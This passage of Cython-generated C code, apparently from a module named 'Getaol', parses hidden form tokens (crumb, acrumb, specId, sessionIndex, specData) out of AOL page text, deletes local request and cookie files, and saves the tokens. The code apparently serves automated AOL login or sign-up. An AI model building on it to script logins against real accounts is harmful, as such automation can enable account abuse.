        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_u_name_specData) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_name_specData);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 350, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 350, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_specData = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_qq, __pyx_n_s_text); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 351, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 351, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_10, __pyx_kp_u_name_browser_fp_data_id_browser) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_name_browser_fp_data_id_browser);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_4, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 352, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_kp_u_name_specId) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_name_specId);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 352, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_6, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_specId = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_qq, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 353, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 353, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_5, __pyx_kp_u_name_cacheStored_input_type_hidd) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_name_cacheStored_input_type_hidd);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 353, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_GetItemInt(__pyx_t_6, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 353, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 354, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_u_name_crumb) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_name_crumb);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 354, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_crumb = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_qq, __pyx_n_s_text); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 355, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 355, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_10, __pyx_kp_u_acrumb_input_type_hidden_value) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_acrumb_input_type_hidden_value);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 355, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_4, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 355, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_kp_u_name_sessionIndex) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_name_sessionIndex);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 356, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_6, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_sessionIndex = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_qq, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 357, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 357, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_5, __pyx_kp_u_name_crumb_input_type_hidden_val) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_name_crumb_input_type_hidden_val);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 357, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_GetItemInt(__pyx_t_6, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 357, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 358, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_u_name_acrumb) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_name_acrumb);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 358, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 358, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_acrumb = __pyx_t_6;
      __pyx_t_6 = 0;

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 360, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_remove); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 360, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_10);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_10, function);
            }
          }
          __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_4, __pyx_kp_u_aol_req_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_aol_req_txt);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 360, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 361, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_remove); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 361, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __pyx_t_10 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_10)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_10);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_kp_u_aol_cok_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_aol_cok_txt);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 361, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_14) {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L10_exception_handled;
        }
        goto __pyx_L11_except_error;
        __pyx_L11_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L14_try_end:;
      }

      
      /*with:*/ {
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 364, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_6, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 364, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_6, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 364, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 364, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __pyx_t_4;
        __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_12, &__pyx_t_11, &__pyx_t_15);
            __Pyx_XGOTREF(__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_11);
            __Pyx_XGOTREF(__pyx_t_15);
            /*try:*/ {
              __pyx_v_t = __pyx_t_10;
              __pyx_t_10 = 0;

              
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_t, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_4 = PyTuple_New(10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_8 = 0;
              __pyx_t_9 = 127;
              __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_specData, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
              __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_5);
              PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5);
              __pyx_t_5 = 0;
              __Pyx_INCREF(__pyx_n_u__37);
              __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
              __pyx_t_8 += 1;
              __Pyx_GIVEREF(__pyx_n_u__37);
              PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_u__37);
              __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_specId, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
              __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_5);
              PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_t_5);
              __pyx_t_5 = 0;
              __Pyx_INCREF(__pyx_n_u__37);
              __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
              __pyx_t_8 += 1;
              __Pyx_GIVEREF(__pyx_n_u__37);
              PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_n_u__37);
              __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_crumb, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
              __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_5);
              PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_t_5);
              __pyx_t_5 = 0;
              __Pyx_INCREF(__pyx_n_u__37);
              __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
              __pyx_t_8 += 1;
              __Pyx_GIVEREF(__pyx_n_u__37);
              PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_n_u__37);
              __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_sessionIndex, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
              __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_5);
              PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_t_5);
              __pyx_t_5 = 0;
              __Pyx_INCREF(__pyx_n_u__37);
              __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
              __pyx_t_8 += 1;
              __Pyx_GIVEREF(__pyx_n_u__37);
              PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_n_u__37);
              __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_acrumb, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
              __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_5);
              PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_t_5);
              __pyx_t_5 = 0;
              __Pyx_INCREF(__pyx_kp_u__5);
              __pyx_t_8 += 1;
              __Pyx_GIVEREF(__pyx_kp_u__5);
              PyTuple_SET_ITEM(__pyx_t_4, 9, __pyx_kp_u__5);
              __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 10, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              __pyx_t_4 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_4)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_4);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 365, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

              
            }
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            goto __pyx_L24_try_end;
            __pyx_L19_error:;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("source.Getaol", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 364, __pyx_L21_except_error)
